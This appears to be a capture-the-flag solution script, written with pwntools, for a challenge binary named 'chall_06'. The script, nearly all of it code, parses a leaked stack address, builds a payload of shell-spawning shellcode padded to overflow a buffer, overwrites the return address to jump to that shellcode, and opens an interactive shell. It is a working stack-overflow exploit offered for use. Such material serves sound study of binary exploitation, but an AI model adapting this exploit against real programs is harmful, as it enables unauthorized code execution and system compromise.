# similar to the previous, use a memory address that the vulnerable program leaks to calculate the address of the stack, then direct the program to execute shellcode that we inject onto the stack via a buffer overflow.
from pwn import *

p = process("./chall_06")

p.recvuntil(b"0x")

stack = p64(int(b"0x" + p.recvuntil(b"\n")[0:-1], 16) - 112)

p.sendline(b"junk")

context.arch = "amd64"
shellcode_bytes = asm(shellcraft.sh())

payload = shellcode_bytes + (88 - len(shellcode_bytes)) * b"A" + stack

p.sendline(payload)

p.interactive()
